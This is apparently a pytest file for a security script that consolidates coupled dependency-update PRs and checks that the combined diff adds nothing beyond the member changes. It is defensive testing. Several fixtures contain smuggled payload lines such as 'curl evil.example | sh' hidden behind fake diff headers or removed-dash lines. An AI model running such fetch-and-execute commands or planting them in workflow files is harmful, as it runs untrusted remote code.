"""Tests for coupled-set consolidation verification."""

import json

from scripts.security import dep_triage_consolidate as dcon

MEMBER_A = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -1,3 +1,3 @@
-      uses: github/codeql-action/init@aaa # v4.37.9
+      uses: github/codeql-action/init@bbb # v4.38.0
"""

MEMBER_B = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -10,3 +10,3 @@
-      uses: github/codeql-action/analyze@aaa # v4.37.9
+      uses: github/codeql-action/analyze@bbb # v4.38.0
"""


def test_added_lines_extracts_only_additions():
    assert dcon.added_lines(MEMBER_A) == {
        "      uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_added_lines_ignores_file_headers():
    assert not any("+++" in line for line in dcon.added_lines(MEMBER_A))


def test_verify_union_accepts_exact_union():
    # A real `git diff` of a branch touching two hunks in one file emits a
    # single header pair followed by both `@@` hunks -- never two header
    # pairs for the same file back to back. Naively concatenating MEMBER_A
    # and MEMBER_B (each a complete standalone diff) would repeat the header,
    # which `git diff` never does and which valid diff parsing need not
    # tolerate.
    combined = (
        "--- a/.github/workflows/codeql.yml\n"
        "+++ b/.github/workflows/codeql.yml\n"
        "@@ -1,3 +1,3 @@\n"
        "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
        "@@ -10,3 +10,3 @@\n"
        "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
        "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
    )
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
    assert ok and not missing and not extra


def test_verify_union_rejects_missing_member_change():
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
    assert not ok
    assert "      uses: github/codeql-action/analyze@bbb # v4.38.0" in missing


def test_verify_union_rejects_unexplained_extra_change():
    sneaky = (
        MEMBER_A
        + MEMBER_B
        + ("--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n")
    )
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
    assert not ok
    assert "      run: curl evil.example" in extra


def test_branch_name_is_slugified():
    assert dcon.branch_name("github/codeql-action", "4.38.0") == (
        "dep-consolidate/github-codeql-action-4.38.0"
    )


def test_added_lines_preserves_indentation():
    """Indentation is semantics in YAML, so it is part of the comparison."""
    diff = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    assert dcon.added_lines(diff) == {
        "      uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_verify_union_rejects_a_line_relocated_to_another_indent_level():
    """Re-adding an approved line at a different depth is a different change."""
    member = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    relocated = (
        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
        "+uses: github/codeql-action/init@bbb # v4.38.0\n"
    )
    ok, missing, extra = dcon.verify_union([member], relocated)
    assert not ok
    assert missing and extra


def test_added_lines_reports_content_beginning_with_plus_signs():
    """A `+++`-prefixed raw line is a header only after a `---` line."""
    diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n" "+++curl evil.example | sh\n"
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_smuggled_plus_prefixed_content():
    sneaky = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+++curl evil.example | sh\n"
    ok, missing, extra = dcon.verify_union([], sneaky)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_added_lines_reports_payload_after_a_removed_dashes_line():
    """A removed line starting with dashes must not arm the header skip."""
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "---smuggled-removed-marker\n"
        "+++curl evil.example | sh\n"
    )
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_payload_hidden_behind_a_removed_dashes_line():
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "---smuggled-removed-marker\n"
        "+++curl evil.example | sh\n"
    )
    ok, missing, extra = dcon.verify_union([], diff)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_added_lines_skips_headers_in_a_multi_file_git_diff():
    """Both genuine header pairs are skipped; both added lines are reported."""
    diff = (
        "diff --git a/x.yml b/x.yml\n--- a/x.yml\n+++ b/x.yml\n@@ -1 +1 @@\n"
        "+      first: one\n"
        "diff --git a/y.yml b/y.yml\n--- a/y.yml\n+++ b/y.yml\n@@ -1 +1 @@\n"
        "+      second: two\n"
    )
    assert dcon.added_lines(diff) == {"      first: one", "      second: two"}


def test_added_lines_skips_a_dev_null_header_pair():
    diff = (
        "diff --git a/n.yml b/n.yml\n--- /dev/null\n+++ b/n.yml\n@@ -0,0 +1 @@\n"
        "+      created: yes\n"
    )
    assert dcon.added_lines(diff) == {"      created: yes"}


def test_added_lines_reports_payload_when_no_hunk_marker_is_present():
    """Outside a hunk, only a real `--- ` header may arm the skip."""
    diff = "---smuggled\n+++curl evil.example | sh\n"
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_payload_in_a_hunkless_diff():
    diff = "---smuggled\n+++curl evil.example | sh\n"
    ok, missing, extra = dcon.verify_union([], diff)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_added_lines_reports_payload_after_a_removed_dashes_line_with_space():
    """A removed line whose content starts '-- ' must not arm the header skip."""
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "--- something\n"
        "+++curl evil.example | sh\n"
    )
    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}


def test_verify_union_rejects_payload_behind_a_spaced_dashes_removal():
    diff = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "--- something\n"
        "+++curl evil.example | sh\n"
    )
    ok, missing, extra = dcon.verify_union([], diff)
    assert not ok
    assert "++curl evil.example | sh" in extra


def test_families_from_decisions_groups_coupled_members():
    decisions = [
        {"number": 452, "code": "coupled", "family": "github/codeql-action"},
        {"number": 450, "code": "coupled", "family": "github/codeql-action"},
        {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
        {"number": 439, "code": "candidate", "family": None},
    ]
    families = dcon.families_from_decisions(decisions)
    assert families["github/codeql-action"] == [450, 452]
    assert families["npm:/frontend:vitest"] == [442]
    assert 439 not in [n for v in families.values() for n in v]


def test_families_from_decisions_ignores_non_coupled():
    assert (
        dcon.families_from_decisions(
            [{"number": 1, "code": "merge-safe", "family": None}]
        )
        == {}
    )


def test_consolidation_body_names_every_member_and_the_coupling():
    body = dcon.consolidation_body(
        "github/codeql-action", "4.38.0", [450, 452, 453, 454]
    )
    for number in (450, 452, 453, 454):
        assert f"#{number}" in body
    assert "together" in body.lower()
    assert "4.38.0" in body


def test_consolidation_body_does_not_claim_members_were_closed():
    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
    assert "closed" not in body.lower()
    assert "left open" in body.lower()


class FakeRun:
    """Records commands; returns canned stdout per matched prefix."""

    def __init__(self, responses=None, fail_on=None):
        self.calls = []
        self.responses = responses or {}
        self.fail_on = fail_on or ()

    def __call__(self, args, capture=False):
        self.calls.append(list(args))
        joined = " ".join(args)
        for needle in self.fail_on:
            if needle in joined:
                raise dcon.CommandFailed(joined)
        for needle, out in self.responses.items():
            if needle in joined:
                return out
        return ""

    def ran(self, needle):
        return any(needle in " ".join(c) for c in self.calls)


DIFF_A = (
    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
)
DIFF_B = (
    "--- a/w.yml\n+++ b/w.yml\n@@ -9 +9 @@\n"
    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
)
# A real `git diff` of a branch that merged both member PRs emits a single
# header pair for the shared file followed by both hunks -- never two header
# pairs back to back (see test_verify_union_accepts_exact_union above, which
# documents the same point). Naively concatenating DIFF_A and DIFF_B as
# standalone diffs would repeat the header pair, which `added_lines` -- by
# design, per its docstring -- treats as content once already inside a hunk
# with no `diff --git` separator to reset the state. That is the correct,
# security-conservative direction (over-report, never silently drop an
# addition), but it means these two tests need the realistic single-header
# combined diff, not a naive concatenation of the two member diffs.
COMBINED = (
    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
    "@@ -9 +9 @@\n"
    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
)


def test_consolidate_family_opens_pr_when_union_matches():
    run = FakeRun(
        responses={
            "diff origin/main...pr-450": DIFF_A,
            "diff origin/main...pr-452": DIFF_B,
            "diff origin/main...HEAD": COMBINED,
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert ok, message
    assert run.ran("switch -c dep-consolidate/github-codeql-action-4.38.0")
    assert run.ran("pr create")


def test_consolidate_family_refuses_when_union_has_extra_lines():
    """An added line no member introduced is an unreviewed change."""
    sneaky = COMBINED + (
        "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n"
        "+      run: curl evil.example\n"
    )
    run = FakeRun(
        responses={
            "diff origin/main...pr-450": DIFF_A,
            "diff origin/main...pr-452": DIFF_B,
            "diff origin/main...HEAD": sneaky,
        }
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "union" in message.lower()
    assert not run.ran("pr create")


def test_consolidate_family_aborts_on_merge_conflict():
    run = FakeRun(
        responses={"diff origin/main...pr-450": DIFF_A},
        fail_on=("merge --no-edit pr-452",),
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "conflict" in message.lower()
    assert run.ran("merge --abort")
    assert not run.ran("pr create")


def test_consolidate_family_never_merges_or_approves():
    run = FakeRun(
        responses={
            "diff origin/main...pr-450": DIFF_A,
            "diff origin/main...pr-452": DIFF_B,
            "diff origin/main...HEAD": COMBINED,
        }
    )
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    for forbidden in ("pr merge", "pr review", "pr ready"):
        assert not run.ran(forbidden), f"must never run: {forbidden}"


def _write_fixtures(tmp_path):
    decisions = {
        "decisions": [
            {"number": 452, "code": "coupled", "family": "github/codeql-action"},
            {"number": 450, "code": "coupled", "family": "github/codeql-action"},
            {"number": 439, "code": "candidate", "family": None},
        ]
    }
    snapshot = {
        "pull_requests": [
            {"number": 452, "to_version": "4.38.0"},
            {"number": 450, "to_version": "4.38.0"},
            {"number": 439, "to_version": "1.2.3"},
        ]
    }
    dec_path = tmp_path / "decisions.json"
    snap_path = tmp_path / "snapshot.json"
    dec_path.write_text(json.dumps(decisions), encoding="utf-8")
    snap_path.write_text(json.dumps(snapshot), encoding="utf-8")
    return dec_path, snap_path


def test_main_dry_run_prints_plan_without_execute(tmp_path, capsys):
    """Without --execute, main must be pure: no consolidate_family call at all."""
    dec_path, snap_path = _write_fixtures(tmp_path)
    rc = dcon.main(["--decisions", str(dec_path), "--snapshot", str(snap_path)])
    assert rc == 0
    out = capsys.readouterr().out
    assert "would consolidate" in out
    assert "github/codeql-action" in out
    assert "450" in out and "452" in out


def test_main_skips_families_with_a_single_member(tmp_path, capsys):
    """A lone `coupled` PR (e.g. a family whose sibling already merged) is not
    consolidated -- there is nothing to union against."""
    decisions = {
        "decisions": [
            {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
        ]
    }
    snapshot = {"pull_requests": [{"number": 442, "to_version": "2.0.0"}]}
    dec_path = tmp_path / "decisions.json"
    snap_path = tmp_path / "snapshot.json"
    dec_path.write_text(json.dumps(decisions), encoding="utf-8")
    snap_path.write_text(json.dumps(snapshot), encoding="utf-8")

    rc = dcon.main(["--decisions", str(dec_path), "--snapshot", str(snap_path)])
    assert rc == 0
    assert "would consolidate" not in capsys.readouterr().out


def test_main_execute_invokes_consolidate_family_per_family(
    tmp_path, monkeypatch, capsys
):
    """`--execute` drives `consolidate_family`; the network/git seam is still
    the injected `run`, so this patches the function itself rather than
    touching a real git checkout."""
    dec_path, snap_path = _write_fixtures(tmp_path)
    calls = []

    def fake_consolidate_family(family, version, members, run=dcon._run):
        calls.append((family, version, members))
        return (True, f"family {family}: opened dep-consolidate/fake")

    monkeypatch.setattr(dcon, "consolidate_family", fake_consolidate_family)
    rc = dcon.main(
        ["--decisions", str(dec_path), "--snapshot", str(snap_path), "--execute"]
    )
    assert rc == 0
    assert calls == [("github/codeql-action", "4.38.0", [450, 452])]
    assert "opened dep-consolidate/fake" in capsys.readouterr().out


def test_main_execute_reports_warning_on_family_failure(tmp_path, monkeypatch, capsys):
    dec_path, snap_path = _write_fixtures(tmp_path)

    def fake_consolidate_family(family, version, members, run=dcon._run):
        return (False, f"family {family}: union mismatch")

    monkeypatch.setattr(dcon, "consolidate_family", fake_consolidate_family)
    rc = dcon.main(
        ["--decisions", str(dec_path), "--snapshot", str(snap_path), "--execute"]
    )
    assert rc == 0
    assert "::warning::" in capsys.readouterr().out
